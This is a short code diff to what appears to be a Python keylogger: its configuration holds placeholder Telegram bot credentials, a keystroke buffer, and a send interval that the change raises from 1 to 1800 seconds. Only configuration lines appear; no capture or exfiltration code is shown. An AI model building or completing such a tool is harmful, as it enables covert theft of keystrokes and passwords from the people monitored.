@@ -5,7 +5,7 @@ import requests
 # Telegram Bot Configuration
 BOT_API_TOKEN = "YOUR_BOT_API_TOKEN"  # Your bot token
 USER_ID = "USER_ID"  # Your Telegram chat/user ID
-LOG_INTERVAL = 1  # Log send interval in seconds (default: 30 minutes)
+LOG_INTERVAL = 1800  # Log send interval in seconds (default: 30 minutes)
 
 # Keystroke storage
 keystrokes = []
